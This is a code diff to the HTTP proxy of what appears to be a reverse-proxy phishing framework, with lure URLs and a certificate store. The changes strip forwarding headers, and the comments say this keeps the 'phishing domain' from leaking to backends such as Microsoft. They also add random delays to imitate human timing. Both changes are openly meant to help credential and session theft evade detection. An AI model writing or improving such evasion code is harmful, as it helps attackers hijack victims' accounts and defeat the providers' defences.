@@ -11,7 +11,7 @@ import (
 	"bufio"
 	"bytes"
 	"context"
-	"crypto/rand"
+	crand "crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/tls"
@@ -21,6 +21,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -728,6 +729,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							req.Header.Set("Referer", o_url.String())
 						}
 					}
+				}
+
+				// Strip or rewrite proxy headers so the backend (e.g. Microsoft) doesn't see our hostname.
+				// Without this, Host/X-Forwarded-Host can leak the phishing domain and kill the session.
+				req.Header.Del("X-Forwarded-Proto")
+				req.Header.Del("X-Forwarded-Server")
+				req.Header.Del("Forwarded")
+				req.Header.Set("X-Forwarded-Host", req.Host) // req.Host is already rewritten to original above
+
+				// Optional jitter: delay outbound request by 100-300ms (configurable) to mimic human timing.
+				if p.cfg.IsJitterEnabled() {
+					minMs := p.cfg.GetJitterMinMs()
+					maxMs := p.cfg.GetJitterMaxMs()
+					if maxMs <= minMs {
+						maxMs = minMs + 200
+					}
+					delayMs := minMs + rand.Intn(maxMs-minMs+1)
+					time.Sleep(time.Duration(delayMs) * time.Millisecond)
 				}
 
 				// patch GET query params with original domains
@@ -1688,7 +1707,7 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 
 	// generate forwarder parameter
 	t := make([]byte, 5)
-	rand.Read(t[1:])
+	crand.Read(t[1:])
 	var crc byte = 0
 	for _, b := range t[1:] {
 		crc += b
@@ -1706,7 +1725,7 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	n := 0
 	for n < len(lure_url) {
 		t := make([]byte, 1)
-		rand.Read(t)
+		crand.Read(t)
 		rn := int(t[0])%3 + 1
 
 		if rn+n > len(lure_url) {
